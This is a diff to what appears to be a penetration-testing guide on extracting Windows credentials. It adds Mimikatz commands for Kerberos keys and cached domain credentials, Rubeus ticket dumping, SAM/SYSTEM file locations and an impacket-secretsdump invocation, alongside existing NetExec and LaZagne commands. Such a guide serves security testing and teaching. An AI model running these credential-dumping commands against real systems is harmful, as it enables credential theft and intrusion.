@@ -46,15 +46,23 @@ Then, use [Mimikatz](https://github.com/gentilkiwi/mimikatz) to dump credentials
 # Engage SeDebugPrivlege, to interact with a process owned by another account.
 privilege::debug
 
+# Elevate first.
+token::elevate
+
 # Dump passwords of all logged on users.
 sekurlsa::logonpasswords
 
 # Dump NTLM hashes from SAM.
-token::elevate
 lsadump::sam
 
 # Dump Kerberos tickets stored in-memory.
 sekurlsa::tickets
+
+# Dump Kerberos encryption keys of logged on users.
+sekurlsa::ekeys
+
+# Dump Domain Cached Credentials from HKLM\SECURITY.
+lsadump::cache
 ```
 
 It’s also possible to do it remotely with [NetExec](https://github.com/Pennyw0rth/NetExec/).
@@ -66,10 +74,30 @@ nxc smb $target -u $username -p $password -M mimikatz
 nxc smb $target -u $username -p $password -M lsassy
 ```
 
-Finally, you can use [LaZagne](https://github.com/AlessandroZ/LaZagne) to extract passwords from many Windows applications like browsers or WiFi.
+If you prefer focusing on Kerberos tickets, [Rubeus](https://github.com/GhostPack/Rubeus) is your friend.
+
+```powershell
+# List all Kerberos tickets in the current session (all sessions if elevated).
+.\Rubeus.exe triage
+
+# Dump Kerberos tickets used for a service for a Locally Unique Identifier.
+.\Rubeus.exe dump /luid:$luid /service:$service /nowrap
+```
+
+You can use [LaZagne](https://github.com/AlessandroZ/LaZagne) to extract passwords from many Windows applications like browsers or WiFi.
 
 ```bash
 laZagne.exe all
+```
+
+Finally, you can use `SAM` and `SYSTEM` files from your target to extract user hashes. These files are by default located at following **protected** paths:
+* C:\Windows\System32\Config\SAM.
+* C:\Windows\System32\Config\SYSTEM.
+
+If you manage to retrieve these two files on your Kali, extract hashes like this.
+
+```bash
+impacket-secretsdump LOCAL -sam SAM -system SYSTEM
 ```
 
 ## Recommendations
